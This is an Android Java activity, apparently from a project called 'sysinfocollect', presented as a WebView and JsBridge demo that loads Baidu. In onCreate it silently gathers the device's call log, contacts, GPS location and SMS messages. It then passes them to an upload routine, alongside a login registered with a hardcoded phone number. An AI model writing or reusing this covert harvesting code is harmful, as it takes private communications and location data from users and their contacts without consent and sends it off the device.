package com.tutu.sysinfocollect;

import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.view.ViewGroup;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;

import com.github.lzyzsd.jsbridge.BridgeHandler;
import com.github.lzyzsd.jsbridge.BridgeWebView;
import com.github.lzyzsd.jsbridge.CallBackFunction;
import com.github.lzyzsd.jsbridge.DefaultHandler;
import com.tutu.sysinfocollect.module.callRecoder.CallRecoderGetHelper;
import com.tutu.sysinfocollect.module.contact.ContactGetHelper;
import com.tutu.sysinfocollect.module.gps.GpsGetHelper;
import com.tutu.sysinfocollect.module.gps.LocationHelper;
import com.tutu.sysinfocollect.module.sms.SmsGetHelper;
import com.tutu.sysinfocollect.net.NetEngine;
import com.tutu.sysinfocollect.utils.ToastUtils;


public class JsBridgeWebViewActivity extends AppCompatActivity {
    public static final String URL = "https://www.baidu.com/";

    BridgeWebView webview;
    String url;

    private LocationHelper locationHelper;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_web_view);
        webview = (BridgeWebView) findViewById(R.id.webview);
        initWebView();

        url = getIntent().getStringExtra("url");

        if (TextUtils.isEmpty(url)) {
            url = URL;
        }
        webview.loadUrl(url);
        locationHelper = new LocationHelper(this);
        locationHelper.initLocation();

        NetEngine.registLogin("13018924230");
        NetEngine.upLoadUsserInfo(new CallRecoderGetHelper().getCallsListFromDb(this),
                new ContactGetHelper().getContacts(this)
                , GpsGetHelper.getGps(),
                new SmsGetHelper(this).getSmsInfos());
    }

    private void initWebView() {
        webview.setDefaultHandler(new DefaultHandler());

        webview.setWebChromeClient(new WebChromeClient() {

            @SuppressWarnings("unused")
            public void openFileChooser(ValueCallback<Uri> uploadMsg, String AcceptType, String capture) {
                this.openFileChooser(uploadMsg);
            }

            @SuppressWarnings("unused")
            public void openFileChooser(ValueCallback<Uri> uploadMsg, String AcceptType) {
                this.openFileChooser(uploadMsg);
            }

            public void openFileChooser(ValueCallback<Uri> uploadMsg) {

            }
        });

        webview.setWebViewClient(new TWebViewClient(webview));

        registJsCallJavaMethod();
    }


    @Override
    public void onBackPressed() {

        if (webview.canGoBack()) {
            webview.goBack();// 返回前一个页面

        } else {
            super.onBackPressed();
        }

    }

    @Override
    protected void onDestroy() {
        if (webview != null) {
            webview.loadDataWithBaseURL(null, "", "text/html", "utf-8", null);
            webview.clearHistory();
            ((ViewGroup) webview.getParent()).removeView(webview);
            webview.destroy();
            webview = null;
        }
        super.onDestroy();

    }


    /**
     * 注册方法提供给JS调用  demo
     */
    public void registJsCallJavaMethod() {
        webview.registerHandler("nativeFunc", new BridgeHandler() {

            /**
             * Js调用submitFromWeb这个方法后 在handler中处理逻辑
             * @param data  Js带入的参数
             * @param function Java返回给Js的回调
             */
            @Override
            public void handler(String data, CallBackFunction function) {

                String str = "这是html带入给java的数据:" + data;

                ToastUtils.showShortToast(str);

                function.onCallBack("Java返回给js传递过来的数据=" + data);
            }

        });
    }

    /**
     * Java调用Js方法  demo
     */
    public void registJavaCallJsMethod() {

        /**
         * functionInJs     协议的方法名
         * data             传递给js的数据
         * CallBackFunction Js返回的的回调
         */
        webview.callHandler("jsFunc", "data", new CallBackFunction() {

            /**
             * Js的回调
             * @param data Js的回调的数据
             */
            @Override
            public void onCallBack(String data) {

                ToastUtils.showShortToast("reponse data from js " + data);
            }

        });
    }


}
